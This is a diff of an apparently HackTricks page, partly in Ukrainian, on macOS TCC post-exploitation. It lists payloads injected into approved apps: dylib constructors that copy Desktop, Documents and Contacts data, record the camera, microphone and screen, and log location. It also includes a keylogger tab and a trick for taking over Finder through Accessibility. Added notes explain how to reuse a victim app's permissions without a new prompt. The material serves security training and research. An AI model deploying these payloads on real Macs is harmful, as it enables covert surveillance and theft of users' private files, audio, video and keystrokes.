@@ -2,14 +2,22 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-### Робочий стіл
+> [!TIP]
+> Рішення TCC прив’язані до **ідентичності процесу**, який запитує ресурс. У post-exploitation зазвичай мета — **впровадити ці payloads в уже схвалений app** (або іншим чином виконати їх у його bundle / signature context), замість запуску нового helper, який викличе власний prompt.
+>
+> Для **Screen Recording**, **Input Monitoring** і **synthetic input** сучасний macOS також надає явні preflight / request APIs, як-от `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess` і `CGRequestPostEventAccess`.
 
-- **Entitlement**: Немає
+> [!WARNING]
+> Це все ще дуже реальний attack path: нещодавні дослідження permission-theft проти Microsoft macOS apps показали, що **weak library validation / plugin loading** може дозволити attacker повторно використати вже надані victim app **camera**, **microphone** та інші TCC permissions без другого prompt.
+
+### Desktop
+
+- **Entitlement**: None
 - **TCC**: kTCCServiceSystemPolicyDesktopFolder
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-Скопіюйте `$HOME/Desktop` до `/tmp/desktop`.
+Copy `$HOME/Desktop` to `/tmp/desktop`.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -51,14 +59,14 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 {{#endtab}}
 {{#endtabs}}
 
-### Документи
+### Documents
 
-- **Право**: Немає
+- **Entitlement**: None
 - **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {{#tabs}}
 {{#tab name="ObjetiveC"}}
-Скопіюйте `$HOME/Documents` до `/tmp/documents`.
+Скопіювати `$HOME/Documents` до `/tmp/documents`.
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -102,7 +110,7 @@ cp -r "$HOME/Documents" "/tmp/documents"
 
 ### Завантаження
 
-- **Право**: Немає
+- **Entitlement**: None
 - **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {{#tabs}}
@@ -149,9 +157,9 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 {{#endtab}}
 {{#endtabs}}
 
-### Бібліотека фотографій
+### Photos Library
 
-- **Право**: `com.apple.security.personal-information.photos-library`
+- **Entitlement**: `com.apple.security.personal-information.photos-library`
 - **TCC**: `kTCCServicePhotos`
 
 {{#tabs}}
@@ -198,9 +206,9 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 {{#endtab}}
 {{#endtabs}}
 
-### Контакти
+### Contacts
 
-- **Право**: `com.apple.security.personal-information.addressbook`
+- **Entitlement**: `com.apple.security.personal-information.addressbook`
 - **TCC**: `kTCCServiceAddressBook`
 
 {{#tabs}}
@@ -247,9 +255,9 @@ cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 {{#endtab}}
 {{#endtabs}}
 
-### Календар
+### Calendar
 
-- **Право**: `com.apple.security.personal-information.calendars`
+- **Entitlement**: `com.apple.security.personal-information.calendars`
 - **TCC**: `kTCCServiceCalendar`
 
 {{#tabs}}
@@ -296,14 +304,14 @@ cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 {{#endtab}}
 {{#endtabs}}
 
-### Камера
+### Camera
 
-- **Право**: `com.apple.security.device.camera`
+- **Entitlement**: `com.apple.security.device.camera`
 - **TCC**: `kTCCServiceCamera`
 
 {{#tabs}}
-{{#tab name="ObjetiveC - Запис"}}
-Записати 3-секундне відео та зберегти його в **`/tmp/recording.mov`**
+{{#tab name="ObjetiveC - Record"}}
+Записати 3-секундне відео і зберегти його в **`/tmp/recording.mov`**
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -415,7 +423,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Зробіть фото за допомогою камери
+Зробити фото за допомогою камери
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
@@ -424,12 +432,12 @@ ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 
 ### Мікрофон
 
-- **Право**: **com.apple.security.device.audio-input**
+- **Entitlement**: **com.apple.security.device.audio-input**
 - **TCC**: `kTCCServiceMicrophone`
 
 {{#tabs}}
-{{#tab name="ObjetiveC - Запис"}}
-Записати 5 секунд аудіо та зберегти його в `/tmp/recording.m4a`
+{{#tab name="ObjetiveC - Record"}}
+Записати 5 с аудіо і зберегти його в `/tmp/recording.m4a`
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -529,7 +537,7 @@ fclose(stderr); // Close the file stream
 {{#endtab}}
 
 {{#tab name="ObjectiveC - Check"}}
-Перевірте, чи має додаток доступ до мікрофона.
+Перевірте, чи має застосунок доступ до мікрофона.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -560,7 +568,7 @@ static void telegram(int argc, const char **argv) {
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Запишіть 5-секундний аудіофайл і збережіть його в `/tmp/recording.wav`
+Записати 5-секундне аудіо та зберегти його в `/tmp/recording.wav`
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -570,17 +578,17 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {{#endtab}}
 {{#endtabs}}
 
-### Місцезнаходження
+### Розташування
 
 > [!TIP]
-> Щоб додаток міг отримати місцезнаходження, **Служби місцезнаходження** (з Конфіденційності та безпеки) **повинні бути увімкнені,** інакше він не зможе отримати доступ до нього.
+> Щоб додаток отримав доступ до розташування, **Location Services** (у Privacy & Security) **мають бути увімкнені,** інакше він не зможе отримати до нього доступ.
 
-- **Право**: `com.apple.security.personal-information.location`
-- **TCC**: Надано в `/var/db/locationd/clients.plist`
+- **Entitlement**: `com.apple.security.personal-information.location`
+- **TCC**: Granted in `/var/db/locationd/clients.plist`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-Запишіть місцезнаходження в `/tmp/logs.txt`
+Записати розташування в `/tmp/logs.txt`
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -630,21 +638,29 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Отримати доступ до місця розташування
+Отримати поточне розташування з shell.
+```bash
+# Fast option: use a dedicated CoreLocation CLI helper
+brew install --cask corelocationcli
+CoreLocationCLI --json
+
+# Keep printing updates while the device moves
+CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
 ```
-???
-```
+> [!TIP]
+> Це все ще залежить від того, що **Location Services** увімкнено, і інструмент / термінал отримує TCC-approval. `CoreLocationCLI` також relies on Wi-Fi-assisted positioning на більшості Mac, тож якщо Wi-Fi вимкнено, це часто закінчується `kCLErrorDomain error 0`.
+
 {{#endtab}}
 {{#endtabs}}
 
-### Запис екрану
+### Screen Recording
 
-- **Право**: Немає
+- **Entitlement**: None
 - **TCC**: `kTCCServiceScreenCapture`
 
 {{#tabs}}
 {{#tab name="ObjectiveC"}}
-Записати основний екран протягом 5 секунд у `/tmp/screen.mov`
+Записати головний екран на 5s у `/tmp/screen.mov`
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -672,6 +688,7 @@ exit(0);
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
+{
 freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
 AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
@@ -700,23 +717,47 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 ```
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Check / Prompt"}}
+Перевірте, чи поточний процес може захоплювати екран і за потреби викликати TCC prompt.
+```objectivec
+#import <Foundation/Foundation.h>
+#import <CoreGraphics/CoreGraphics.h>
+
+// clang -framework Foundation -framework CoreGraphics -dynamiclib ScreenCheck.m -o ScreenCheck.dylib
+
+__attribute__((constructor))
+static void screencheck(int argc, const char **argv) {
+freopen("/tmp/logs.txt", "a", stderr);
+BOOL allowed = CGPreflightScreenCaptureAccess();
+if (!allowed) {
+allowed = CGRequestScreenCaptureAccess();
+}
+NSLog(@"Screen capture access: %@", allowed ? @"granted" : @"denied");
+fclose(stderr);
+}
+```
+{{#endtab}}
+
 {{#tab name="Shell"}}
-Запишіть головний екран протягом 5 секунд
+Записати головний екран протягом 5 с
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {{#endtab}}
 {{#endtabs}}
 
-### Доступність
+> [!TIP]
+> On **macOS 12.3+**, `ScreenCaptureKit` is usually the better post-exploitation primitive than `AVCaptureScreenInput`: it can do high-performance streaming, single-frame grabs with `SCScreenshotManager`, and stream **system audio**. If you also want **microphone** audio, you still need `kTCCServiceMicrophone`. For more desktop-session abuse primitives, see [this related page](../macos-input-monitoring-screen-capture-accessibility.md).
 
-- **Право**: Немає
+### Accessibility
+
+- **Entitlement**: None
 - **TCC**: `kTCCServiceAccessibility`
 
-Використовуйте привілей TCC, щоб прийняти контроль над Finder, натискаючи Enter, і обійти TCC таким чином
+Використовуйте привілей TCC, щоб прийняти керування Finder, натиснувши enter, і таким чином обійти TCC
 
 {{#tabs}}
-{{#tab name="Прийняти TCC"}}
+{{#tab name="Accept TCC"}}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -770,7 +811,7 @@ return 0;
 {{#endtab}}
 
 {{#tab name="Keylogger"}}
-Зберігайте натиснуті клавіші в **`/tmp/keystrokes.txt`**
+Зберігати натиснуті клавіші в **`/tmp/keystrokes.txt`**
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -877,6 +918,17 @@ return 0;
 {{#endtab}}
 {{#endtabs}}
 
-> [!CAUTION] > **Доступність є дуже потужним дозволом**, ви можете зловживати нею іншим чином, наприклад, ви можете виконати **атаку на натискання клавіш** лише з її допомогою, не викликаючи System Events.
+> [!CAUTION] > **Accessibility — це дуже потужний дозвіл**, його можна зловживати й іншими способами; наприклад, можна виконати **keystrokes attack** лише з його допомогою, без потреби викликати System Events.
+
+> [!TIP]
+> Новіші версії macOS також розділяють зловживання desktop-session між **Input Monitoring** (`kTCCServiceListenEvent`) і **synthetic input** (`kTCCServicePostEvent`). Якщо вам потрібні keylogging, screen grabs або raw event injection замість AXUIElement automation, перегляньте [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md).
+
+
+
+## References
+
+- [Cisco Talos - How multiple vulnerabilities in Microsoft apps for macOS pave the way to stealing permissions](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
+- [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
+
 
 {{#include ../../../../banners/hacktricks-training.md}}
